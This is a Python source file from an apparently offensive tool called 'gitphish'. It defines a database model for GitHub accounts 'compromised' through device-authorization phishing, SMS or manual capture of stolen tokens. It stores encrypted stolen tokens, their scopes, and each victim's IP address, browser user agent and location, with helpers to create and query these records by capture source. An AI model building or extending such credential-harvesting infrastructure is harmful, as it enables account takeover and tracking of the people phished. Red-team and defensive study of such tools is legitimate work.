"""
Database model for compromised GitHub accounts.

This module contains SQLAlchemy models for storing and managing
compromised GitHub accounts obtained from victims.
"""

import json
from datetime import datetime
from typing import Dict, Any, List
from sqlalchemy import Column, String, Text, Boolean
from sqlalchemy.orm import Session
from gitphish.models.github.base_github_account import BaseGitHubAccount
from gitphish.core.accounts.auth.token_validator import GitHubTokenInfo


class CompromisedGitHubAccount(BaseGitHubAccount):
    """
    Model for storing compromised GitHub accounts from victims.

    This model stores GitHub accounts obtained through device auth flows
    or manually added compromised PATs.
    """

    __tablename__ = "compromised_accounts"

    # Additional fields specific to compromised accounts
    token_hash = Column(
        String(64), nullable=False, unique=True
    )  # Override to add unique constraint

    # Source information
    source = Column(
        String(50), nullable=False, default="manual"
    )  # 'manual', 'sms', or 'dynamic'
    device_auth_session_id = Column(
        String(255)
    )  # Reference to device auth session if applicable

    # Victim information
    victim_ip = Column(String(45))  # IPv4 or IPv6
    victim_user_agent = Column(Text)
    victim_location = Column(String(255))  # Geolocation if available

    # Flags specific to compromised accounts
    is_analyzed = Column(
        Boolean, default=False, nullable=False
    )  # Whether account has been analyzed

    # Flag to indicate this model stores scopes as JSON strings
    _store_scopes_as_json_string = True

    @property
    def account_type(self) -> str:
        """Return the account type for logging and display purposes."""
        return "compromised"

    def to_dict(self, include_sensitive: bool = False) -> Dict[str, Any]:
        """
        Convert the account to a dictionary representation.

        Args:
            include_sensitive: Whether to include sensitive information like token hash

        Returns:
            Dictionary containing account information
        """
        # Get base dictionary from parent class
        data = super().to_dict(include_sensitive)

        # Add compromised-specific fields
        data.update(
            {
                "source": self.source,
                "device_auth_session_id": self.device_auth_session_id,
                "victim_ip": self.victim_ip,
                "victim_user_agent": self.victim_user_agent,
                "victim_location": self.victim_location,
                "is_analyzed": self.is_analyzed,
            }
        )

        return data

    @classmethod
    def create_from_token_info(
        cls,
        token_info: "GitHubTokenInfo",
        token: str,
        source: str = "manual",
        device_auth_session_id: str = None,
        victim_info: Dict[str, Any] = None,
        override_email: str = None,
    ) -> "CompromisedGitHubAccount":
        """
        Create a CompromisedGitHubAccount from validated token information.

        Args:
            token_info: Validated GitHubTokenInfo object
            token: The actual token (will be hashed and masked)
            source: Source of the token ('manual', 'sms', or 'dynamic')
            device_auth_session_id: Device auth session ID if applicable
            victim_info: Additional victim information (IP, user agent, etc.)
            override_email: Email to use instead of token_info.email (for SMS/dynamic captures where we know the email)

        Returns:
            CompromisedGitHubAccount instance
        """
        # Create token hash and preview using base class methods
        token_hash = cls._create_token_hash(token)
        token_preview = cls._create_token_preview(token)
        encrypted_token = cls._encrypt_token(token)

        victim_info = victim_info or {}

        # Use override_email if provided, otherwise fall back to token_info.email
        email = override_email if override_email else token_info.email

        account = cls(
            username=token_info.username,
            user_id=token_info.user_id,
            email=email,
            name=token_info.name,
            avatar_url=token_info.avatar_url,
            token_preview=token_preview,
            token_hash=token_hash,
            encrypted_token=encrypted_token,
            scopes=(json.dumps(token_info.scopes) if token_info.scopes else None),
            source=source,
            device_auth_session_id=device_auth_session_id,
            is_valid=True,
            rate_limit_remaining=token_info.rate_limit_remaining,
            victim_ip=victim_info.get("ip"),
            victim_user_agent=victim_info.get("user_agent"),
            victim_location=victim_info.get("location"),
        )

        return account

    def mark_as_analyzed(self):
        """Mark the account as analyzed."""
        self.is_analyzed = True
        self.updated_at = datetime.utcnow()

    def mark_as_unanalyzed(self):
        """Unmark the account as analyzed."""
        self.is_analyzed = False
        self.updated_at = datetime.utcnow()

    @staticmethod
    def get_by_source(
        session: Session, source: str
    ) -> List["CompromisedGitHubAccount"]:
        """
        Get compromised accounts by source.

        Args:
            session: Database session
            source: Source type ('manual', 'sms', or 'dynamic')

        Returns:
            List of CompromisedGitHubAccount instances
        """
        return (
            session.query(CompromisedGitHubAccount)
            .filter(
                CompromisedGitHubAccount.source == source,
                CompromisedGitHubAccount.is_active,
            )
            .order_by(CompromisedGitHubAccount.created_at.desc())
            .all()
        )
